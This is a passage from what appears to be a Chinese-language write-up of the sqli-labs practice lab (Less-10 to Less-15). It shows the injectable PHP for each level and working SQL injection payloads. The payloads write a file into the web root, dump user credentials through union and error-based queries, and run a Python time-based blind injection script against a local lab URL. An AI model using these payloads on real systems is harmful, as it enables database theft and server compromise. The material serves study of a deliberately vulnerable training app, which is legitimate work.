class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-</strong>10</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-10\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a><strong>Less-</strong>11</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&#39; union select group_concat(username),group_concat(password) from users;#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/JKzOt2PURorkjbf.png" style="zoom:67%;" /><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a><strong>Less-</strong>12</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&quot;) union select group_concat(username),group_concat(password) from users;#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a><strong>Less-</strong>13</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&#39;) and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a><strong>Less-</strong>14</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"  /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a><strong>Less-</strong>15</h1><p>Python（盲注）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># config-start</span></span><br><span class="line">sleep_time = <span class="number">1</span></span><br><span class="line">error_time = <span class="number">0.1</span></span><br><span class="line"><span class="comment"># config-end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">(indexOfResult, indexOfChar, mid)</span>:</span></span><br><span class="line">    <span class="comment"># admin' or ()-- </span></span><br><span class="line">    column_name=<span class="string">"password"</span></span><br><span class="line">    table_name=<span class="string">"username"</span></span><br><span class="line">    database_name=<span class="string">"users"</span></span><br><span class="line">    payload = <span class="string">"((ascii(substring((select "</span> + column_name + <span class="string">" from "</span> + database_name + <span class="string">"  limit "</span> + indexOfResult + <span class="string">",1),"</span> + indexOfChar + <span class="string">",1)))="</span> + mid + <span class="string">")"</span><span class="comment">#此处更改sql语句</span></span><br><span class="line">    payload = &#123;<span class="string">"uname"</span>:<span class="string">"' or (("</span> + payload + <span class="string">") and sleep("</span> + str(sleep_time) + <span class="string">"))-- "</span>,<span class="string">"passwd"</span>:<span class="string">"admin"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exce</span><span class="params">(indexOfResult,indexOfChar,queryASCII)</span>:</span></span><br><span class="line">    <span class="comment"># content-start</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1:801/sqli/Less-15/"</span></span><br><span class="line">    postData = getPayload(indexOfResult,indexOfChar,queryASCII)</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    requests.post(url, data=postData)</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    <span class="comment"># content-end</span></span><br><span class="line">    use_time = after_time - before_time</span><br><span class="line">    <span class="comment"># judge-start</span></span><br><span class="line">    <span class="comment"># 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)</span></span><br><span class="line">    <span class="comment"># 当使用二分查找的时候 , 控制正确/错误的时候执行sleep函数就不那么重要了</span></span><br><span class="line">    <span class="keyword">if</span> abs(use_time) &gt; error_time: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># judge-end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doSearch</span><span class="params">(indexOfResult,indexOfChar)</span>:</span></span><br><span class="line">    <span class="comment"># 根据数据库中出现的字符的频率顺序重新构造列表进行查询</span></span><br><span class="line">    order = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'_'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">' '</span>,<span class="string">'!'</span>,<span class="string">'"'</span>,<span class="string">'#'</span>,<span class="string">'$'</span>,<span class="string">'%'</span>,<span class="string">'&amp;'</span>,<span class="string">'\''</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">','</span>,<span class="string">'-'</span>,<span class="string">'.'</span>,<span class="string">'/'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">':'</span>,<span class="string">';'</span>,<span class="string">'&lt;'</span>,<span class="string">'='</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'@'</span>,<span class="string">'['</span>,<span class="string">'\\'</span>,<span class="string">']'</span>,<span class="string">'^'</span>,<span class="string">'`'</span>,<span class="string">'&#123;'</span>,<span class="string">'|'</span>,<span class="string">'&#125;'</span>,<span class="string">'~'</span>]</span><br><span class="line">    <span class="keyword">for</span> queryChar <span class="keyword">in</span> order:</span><br><span class="line">        queryASCII = ord(queryChar)</span><br><span class="line">        <span class="keyword">if</span> exce(str(indexOfResult),str(indexOfChar + <span class="number">1</span>), str(queryASCII)):</span><br><span class="line">            <span class="keyword">return</span> chr(queryASCII)</span><br><span class="line">    <span class="keyword">return</span> chr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 需要遍历的查询结果的数量</span></span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 结果的长度</span></span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            temp = doSearch(i, j) <span class="comment"># 从255开始查询</span></span><br><span class="line">            <span class="keyword">if</span> ord(temp) == <span class="number">1</span>: <span class="comment"># 当为1的时候说明已经查询结束</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sys.stdout.write(temp)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>: <span class="comment"># 当结果集的所有行都被遍历后退出</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">"\r\n"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">search()</span><br><span class="line">代码来源：https://www.jianshu.com/p/e5a42373ed12</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span 